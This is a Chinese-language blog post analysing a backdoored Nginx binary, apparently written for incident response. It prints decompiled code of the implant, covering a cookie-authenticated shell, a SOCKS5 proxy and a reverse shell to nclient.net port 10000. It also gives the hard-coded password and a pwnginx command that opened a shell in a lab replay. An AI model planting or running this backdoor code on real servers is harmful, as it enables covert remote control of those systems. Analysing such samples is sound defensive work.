---
title: "Nginx Backdoor Analysis"
date: 2018-10-19
draft: false
tags: ["Linux"]
---

# 0) Infected Nginx

使用IDA分析后，发现Nginx被嵌入了一个名为 `ngx_http_pwd_init`的lua模块

```c
ngx_int_t __fastcall ngx_http_pwd_init(ngx_conf_t *cf_0)
{
  ngx_http_next_header_filter_11 = ngx_http_top_header_filter;
  ngx_http_top_header_filter = ngx_http_pwd_header_filter;
  ngx_http_next_body_filter_10 = ngx_http_top_body_filter;
  ngx_http_top_body_filter = ngx_http_pwd_body_filter;
  return 0LL;
}

```

后门主要功能代码在 `ngx_http_pwd_header_filter` 函数中，该函数可以用来拦截所有的Nginx访问请求头，并对Request中的Cookie信息来验证后门连接密码，以及要执行的功能。

经分析发现该后门主要有3种功能：

- 1.Shell Execute
- 2.Socks5 Proxy
- 3.Reverse Shell


# 1) Execute shell command

下面截取了一部分的代码，可以发现，通过匹配Cookie中的`worderx`字段来验证连接后门的密码，`typefp`字段作为功能的编号，1号是命令执行，最后调用`exec_shell(cmd_fd)`来返回一个简单的交互式Shell

```c

if ( request->headers_in.cookies.nelts == 1 )
  {
    v5 = *(_BYTE **)(*(_QWORD *)request->headers_in.cookies.elts + 0x20LL);
    v6 = *(_BYTE **)(*(_QWORD *)request->headers_in.cookies.elts + 0x20LL);
    v7 = "worderx=Bo9vrZ6TKBmq; typefp=1"; 	// Match the password, and
    v8 = 30LL;
    do
    {
      if ( !v8 )
        break;
      v3 = *v6 < (const unsigned __int8)*v7;
      v4 = *v6++ == *v7++;
      --v8;
    }
    while ( v4 );
    v9 = !v3 && !v4;
    v10 = v3;
    v11 = v9 < (unsigned __int8)v3;
    v12 = v9 == v10;
    if ( v9 == v10 )
    {
      msend(cmd_fd, "worderx1", 9);
      exec_shell(cmd_fd);
    }

```

exec_shell函数：

```c
int __fastcall exec_shell(int fd)
{
  if ( fork() > 0 )
  {
    close(fd);
    exit(0);
  }
  dup2(fd, STDIN_FILENO);
  dup2(fd, STDOUT_FILENO);
  dup2(fd, STDERR_FILENO);
  execl("/bin/sh", "-sh", 0LL);
  return 0;
}
```

# 2) Socks5 Proxy

第二个功能是socks5代理，匹配功能编号成功后，调用`exec_socks5(cmd_fd)`进入设置代理函数

```c
    {
      v13 = v5;
      v14 = "worderx=Bo9vrZ6TKBmq; typefp=2"; 
      v15 = 30LL;
      do
      {
        if ( !v15 )
          break;
        v11 = *v13 < (const unsigned __int8)*v14;
        v12 = *v13++ == *v14++;
        --v15;
      }
      while ( v12 );
      v16 = !v11 && !v12;
      v17 = v11;
      v18 = v16 < (unsigned __int8)v11;
      v19 = v16 == v17;
      if ( v16 == v17 )
      {
        msend(cmd_fd, "worderx2", 9);
        exec_socks5(cmd_fd);
      }
```

exec_socks5 设置代理函数中创建了一个子进程，随后进入worker函数中去执设置

```c
int __fastcall __noreturn exec_socks5(int fd)
{
  if ( fork() > 0 )
  {
    close(fd);
    exit(0);
  }
  fcntl(fd, F_GETFL, 0LL);
  fcntl(fd, F_SETFL);
  worker(fd);
  exit(0);
}
```

worker函数中根据接收到的域名和端口来创建一个新的udp会话，会后进入forwarder函数开始转发数据

```C
  puts("Recving request...");
  v6 = (unsigned int)recv(csock, buffer, 0x2000uLL, 0); // 接收数据
  printf("Recved %d bytes\n", v6);
  __x = 2;
  if ( buffer[3] == 3 )
  {
    memset(domain, 0, sizeof(domain));
    v7 = (unsigned int)buffer[4];
    strncpy(domain, &buffer[5], v7); // 从数据中提取域名
    v8 = gethostbyname(domain);
    if ( !v8 )
    {
      printf("Cannot Resolv the Domain name:%s\n", domain);
      close(csock);
      return -1;
    }
    memcpy(&dest, *(const void **)v8->h_addr_list, v8->h_length);
    v20 = *(_WORD *)&buffer[v7 + 5];
  }
	// 中间忽略部分代码
  if ( buffer[1] == 4 )
  {
    puts("Hey, its a udp request!");
    sock_fd = socket(2, 2, 0); //创建UDP链接
  }
  else
  {
    sock_fd = socket(2, 1, 0);
  }
	// 中间忽略部分代码
	forwarder(csock, sock_fd); // 进入转发函数
	printf(aWorker, sock_fd);
	close(csock);
	close(sock_fd);
```

forworder函数部分代码

```C
while ( 1 )
  {
    memset(&rfds, 0, sizeof(rfds));
    rfds.fds_bits[v4] |= v5;
    rfds.fds_bits[v7] |= 1LL << (char)to % 64;
    v8 = v2;
    if ( to >= v2 )
      v8 = to;
    if ( select(v8 + 1, &rfds, 0LL, 0LL, 0LL) )
    {
      v9 = rfds.fds_bits[v4];
      if ( _bittest64(&v9, v14) )
      {
        v10 = recv(v2, buffer, 0x2000uLL, 0);
        if ( v10 <= 0 || msend(to, buffer, v10) <= 0 )
          break;
      }
      v11 = rfds.fds_bits[v7];
      if ( _bittest64(&v11, (unsigned int)(to % 64)) )
      {
        v12 = recv(to, buffer, 0x2000uLL, 0);
        if ( v12 <= 0 || msend(v2, buffer, v12) <= 0 )
          break;
      }
    }
  }
```

# 3) Reverse Shell

最后一个功能是反弹shell到一个指定域名`nclient.net`，端口`10000`

```C
v20 = v5;
v21 = "worderx=Bo9vrZ6TKBmq; typefp=3";
v22 = 30LL;
do
{
    if ( !v22 )
        break;
    v18 = *v20 < (const unsigned __int8)*v21;
    v19 = *v20++ == *v21++;
    --v22;
}while ( v19 );
if ( (!v18 && !v19) == v18 )
   re_shell("nclient.net", 10000);
```

re_shell函数

```c
int __fastcall re_shell(char *host, int port)
{
  char *v2; // rbp
  __pid_t v3; // eax
  int sock_fd; // ebx
  struct hostent *v5; // rax
  sockaddr_in server; // [rsp+0h] [rbp-38h]
  in_addr addr; // [rsp+10h] [rbp-28h]

  v2 = host;
  v3 = fork();
  if ( v3 == -1 )
    exit(-1);
  if ( !v3 )
  {
    setsid();
    sock_fd = socket(2, 1, 0);
    if ( sock_fd == -1 )
      exit(-1);
    server.sin_family = 2;
    server.sin_port = __ROR2__(port, 8);
    if ( !inet_pton(2, host, &addr) )
    {
      v5 = gethostbyname(host);
      if ( !v5 )
        exit(-1);
      v2 = inet_ntoa((struct in_addr)(*(struct in_addr **)v5->h_addr_list)->s_addr);
    }
    server.sin_addr.s_addr = inet_addr(v2);
    if ( connect(sock_fd, (const struct sockaddr *)&server, 0x10u) == -1 )
      exit(-1);
    dup2(sock_fd, STDIN_FILENO);
    dup2(sock_fd, STDOUT_FILENO);
    dup2(sock_fd, STDERR_FILENO);
    close(sock_fd);
    execl("/bin/sh", "/bin/sh", "-i", 0LL, *(_QWORD *)&server.sin_family);
  }
  return 0;
}
```

# 3) Traceing & Replay

后来发现该后门是使用的github上开源项目`pwnginx`经过二次开发后的版本，并且修改了用于来连接和校验的cookie中使用的字段名称，以及增加了第三个后门功能，反弹shell到指定域名。

为了复现攻击环境，在虚拟机中使用CentOS7安装了同版本的Nginx，并把主程序替换成被感染的Nginx样本，并启动Nginx服务。

用另一台Ubuntu虚拟机下载`pwnginx`项目源码后，修正验证密码以及执行功能的匹配字段名，编译客户端，并使分析得到的后门密码`Bo9vrZ6TKBmq`尝试连接该后门

```BASH
root@ubuntu:./pwnginx shell 192.168.89.139 80 Bo9vrZ6TKBmq
```

执行结果，成功返回一个交互环境！

```BASH
[i] Obtaining shell access
[i] About to connect to nginx
[i] Enjoy the real world.
id
uid=992(nginx) gid=990(nginx) groups=990(nginx) context=system_u:system_r:initrc_t:s0
```


# 4) References
- [pwnginx Nginx后门](https://github.com/t57root/pwnginx)
- [amcsh](https://github.com/t57root/amcsh)
- [mysql_audit_plugin](https://github.com/t57root/remote-admin-tools/tree/master/mysql_audit_plugin)
- [arbitrary-php-extension](https://github.com/phith0n/arbitrary-php-extension)
- [Makefile的写法](https://www.youtube.com/watch?v=E1_uuFWibuM)